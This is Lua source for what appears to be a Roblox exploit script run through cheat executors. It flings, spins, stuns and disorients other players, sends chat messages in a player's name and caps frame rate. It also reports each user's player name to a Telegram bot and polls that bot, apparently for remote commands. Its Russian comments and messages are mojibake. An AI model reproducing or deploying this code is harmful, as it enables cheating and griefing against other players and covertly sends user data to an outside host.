local function req(url, method, headers, body)
    local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
    if not f then return nil end
    local a = {Url = url, Method = method or "GET", Headers = headers or {}}
    if body then a.Body = body end
    local ok, r = pcall(f, a)
    if ok and r then return r else return nil end
end

local function send(text)
    if not CHAT_ID then return end
    local p = {chat_id = CHAT_ID, text = text, parse_mode = "HTML"}
    req("https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage", "POST", {["Content-Type"] = "application/json"}, HttpService:JSONEncode(p))
end

local function getChat()
    local r = req("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates")
    if r and r.Body then
        local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
        if ok and d and d.result and #d.result > 0 then
            CHAT_ID = d.result[#d.result].message.chat.id
            return true
        end
    end
    return false
end

local scriptUsers = {}
local myPlayer = Players.LocalPlayer
local active = {}
local stunned = {}
local spinning = {}
local cd = {}

local function addUser(p)
    if not scriptUsers[p.UserId] then
        scriptUsers[p.UserId] = p
        send("рџџў <b>"..p.Name.."</b> РїРѕРґРєР»СЋС‡РёР»СЃСЏ!")
    end
end

addUser(myPlayer)

local m = Instance.new("BoolValue")
m.Name = "SpidiUser"
m.Parent = myPlayer

local function findPlayer(inp)
    if not inp or inp == "" then return nil, "вќЊ Р’РІРµРґРё РЅРёРє" end
    local users = {}
    for _, p in pairs(Players:GetPlayers()) do
        if scriptUsers[p.UserId] then table.insert(users, p) end
    end
    local num = tonumber(inp)
    if num and users[num] then return users[num] end
    inp = inp:lower()
    local matches = {}
    for _, p in pairs(users) do
        if p.Name:lower():find(inp, 1, true) or p.DisplayName:lower():find(inp, 1, true) then
            table.insert(matches, p)
        end
    end
    if #matches == 1 then return matches[1]
    elseif #matches > 1 then
        local names = {}
        for _, p in pairs(matches) do table.insert(names, p.Name) end
        return nil, "РќР°Р№РґРµРЅРѕ РЅРµСЃРєРѕР»СЊРєРѕ: "..table.concat(names, ", ")
    else return nil, "РРіСЂРѕРє РЅРµ РЅР°Р№РґРµРЅ" end
end

local function getUsers()
    local list = {}
    local i = 1
    for _, p in pairs(Players:GetPlayers()) do
        if scriptUsers[p.UserId] then
            table.insert(list, i..". "..p.Name)
            i = i + 1
        end
    end
    return list
end

local function getAll()
    local list = {}
    local i = 1
    for _, p in pairs(Players:GetPlayers()) do
        local hs = scriptUsers[p.UserId] and " рџ”Ґ" or ""
        table.insert(list, i..". "..p.Name..hs)
        i = i + 1
    end
    return list
end

-- ==================== РџРћР›РќР«Р™ РЎР‘Р РћРЎ ====================
local function fullReset()
    -- РћСЃС‚Р°РЅР°РІР»РёРІР°РµРј РІСЃРµ Р°РєС‚РёРІРЅС‹Рµ РїСЂРѕС†РµСЃСЃС‹
    for _, d in pairs(active) do
        if d.conn then pcall(d.conn.Disconnect, d.conn) end
        if d.run then d.run = false end
    end
    active = {}
    
    -- РћСЃС‚Р°РЅР°РІР»РёРІР°РµРј РІСЂР°С‰РµРЅРёСЏ
    for _, p in pairs(spinning) do
        p.run = false
    end
    spinning = {}
    
    -- РЎРЅРёРјР°РµРј РѕРіР»СѓС€РµРЅРёСЏ
    stunned = {}
    
    -- РЎР±СЂР°СЃС‹РІР°РµРј РљР”
    cd = {}
    
    -- Р’РѕР·РІСЂР°С‰Р°РµРј РІСЃРµС… РёРіСЂРѕРєРѕРІ РІ РЅРѕСЂРјСѓ
    for _, p in pairs(Players:GetPlayers()) do
        if p.Character then
            local hrp = p.Character:FindFirstChild("HumanoidRootPart")
            if hrp then 
                hrp.Anchored = false
                hrp.CFrame = CFrame.new(hrp.Position)
            end
            local hum = p.Character:FindFirstChild("Humanoid")
            if hum then
                hum.WalkSpeed = 16
                hum.JumpPower = 50
                hum.Sit = false
                hum.Health = 100
                hum.MaxHealth = 100
            end
            -- РЈРґР°Р»СЏРµРј BodyVelocity
            for _, v in pairs(p.Character:GetChildren()) do
                if v:IsA("BodyVelocity") then v:Destroy() end
            end
        end
    end
    
    -- РЈР±РёСЂР°РµРј Р±Р»СЋСЂ
    local blur = Lighting:FindFirstChild("SpidiWarp")
    if blur then blur:Destroy() end
    
    -- РЈР±РёСЂР°РµРј РјСѓР·С‹РєСѓ
    local music = SoundService:FindFirstChild("ClientMusic")
    if music then
        music:Stop()
        music:Destroy()
    end
    
    -- РЎР±СЂР°СЃС‹РІР°РµРј РєР°РјРµСЂСѓ
    local cam = Workspace.CurrentCamera
    if cam then
        cam.CameraType = Enum.CameraType.Custom
    end
    
    send("рџ›‘ <b>РџРћР›РќР«Р™ РЎР‘Р РћРЎ!</b>\nвњ… Р’СЃРµ СЌС„С„РµРєС‚С‹ СѓР±СЂР°РЅС‹\nвњ… Р’СЃРµ РёРіСЂРѕРєРё РІРѕСЃСЃС‚Р°РЅРѕРІР»РµРЅС‹\nвњ… РџР°РјСЏС‚СЊ РѕР±РЅСѓР»РµРЅР°")
end

-- ==================== РњРЈР—Р«РљРђ ====================
local function playMusic(id)
    local old = SoundService:FindFirstChild("ClientMusic")
    if old then old:Destroy() end
    local s = Instance.new("Sound")
    s.Name = "ClientMusic"
    s.SoundId = "rbxassetid://"..tostring(id)
    s.Volume = 1
    s.Looped = true
    s.Parent = SoundService
    s:Play()
end

local function stopMusic()
    local s = SoundService:FindFirstChild("ClientMusic")
    if s then
        s:Stop()
        s:Destroy()
        return true
    end
    return false
end

local function canSend(p)
    local id = p.UserId
    local last = cd[id] or 0
    if tick() - last < 0.3 then return false end
    cd[id] = tick()
    return true
end

local function desorient(p)
    local char = p.Character
    if not char then return end
    local cam = Workspace.CurrentCamera
    if not cam then return end
    cam.CameraType = Enum.CameraType.Scriptable
    local st = tick()
    local conn
    conn = RunService.RenderStepped:Connect(function()
        if tick() - st >= 3 then
            conn:Disconnect()
            cam.CameraType = Enum.CameraType.Custom
            return
        end
        cam.CFrame = cam.CFrame * CFrame.Angles(math.rad(math.random(-15,15)), math.rad(25), math.rad(math.random(-10,10)))
    end)
    active[p.UserId] = {conn = conn}
end

local fpsCapped = false
local function toggleFps()
    fpsCapped = not fpsCapped
    setfpscap(fpsCapped and 10 or 60)
    return fpsCapped
end

local function say(p, msg)
    if not p then return end
    local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if ch then
        ch:SendAsync(msg)
        return
    end
    local legacy = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if legacy then
        local sayRemote = legacy:FindFirstChild("SayMessageRequest")
        if sayRemote then sayRemote:FireServer(msg, "All") end
    end
end

local function stun(p)
    local char = p.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end
    local os = hum.WalkSpeed
    local oj = hum.JumpPower
    hum.WalkSpeed = 0
    hum.JumpPower = 0
    stunned[p.UserId] = {speed = os, jump = oj}
    task.delay(3, function()
        if stunned[p.UserId] then
            local d = stunned[p.UserId]
            local h = p.Character and p.Character:FindFirstChild("Humanoid")
            if h then
                h.WalkSpeed = d.speed
                h.JumpPower = d.jump
            end
            stunned[p.UserId] = nil
        end
    end)
end

local function fling(p)
    local char = p.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not (hrp and hum) then return end
    hum.Sit = true
    local dx = math.random() > 0.5 and 1 or -1
    local dz = math.random() > 0.5 and 1 or -1
    hrp.AssemblyLinearVelocity = Vector3.new(math.random(200,400)*dx, math.random(300,500), math.random(200,400)*dz)
end

local function spin(p, speed)
    speed = speed or 1
    speed = math.clamp(speed, 0.5, 10)
    if spinning[p.UserId] then spinning[p.UserId] = nil end
    local char = p.Character
    if not char then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    local run = true
    spinning[p.UserId] = {run = run}
    active[p.UserId] = {run = run}
    spawn(function()
        while run and spinning[p.UserId] and spinning[p.UserId].run do
            if not p.Character then break end
            local h = p.Character:FindFirstChild("HumanoidRootPart")
            if h then h.CFrame = h.CFrame * CFrame.Angles(0, math.rad(18*speed), 0) end
            task.wait(0.05)
        end
    end)
    return true
end

local function unspin(p)
    if spinning[p.UserId] then
        spinning[p.UserId].run = false
        spinning[p.UserId] = nil
        active[p.UserId] = nil
        local char = p.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then hrp.CFrame = CFrame.new(hrp.Position) end
        end
        return true
    end
    return false
end

local function notify(p, text, dur)
    dur = dur or 5
    local gui = p:FindFirstChild("PlayerGui")
    if not gui then return end
    local screen = Instance.new("ScreenGui")
    screen.Name = "SpidiNotif"
    screen.ResetOnSpawn = false
    screen.Parent = gui
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 450, 0, 50)
    frame.Position = UDim2.new(0.5, -225, 0, 20)
    frame.BackgroundColor3 = Color3.fromRGB(10,10,20)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.Parent = screen
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0,255,0)
    stroke.Thickness = 1
    stroke.Parent = frame
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -20, 1, 0)
    label.Position = UDim2.new(0, 10, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = text or ""
    label.TextColor3 = Color3.fromRGB(255,255,255)
    label.TextSize = 16
    label.Font = Enum.Font.Gotham
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextWrapped = true
    label.Parent = frame
    frame.BackgroundTransparency = 1
    frame.Position = UDim2.new(0.5, -225, 0, -80)
    TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.1,
        Position = UDim2.new(0.5, -225, 0, 20)
    }):Play()
    game:GetService("Debris"):AddItem(screen, dur)
end

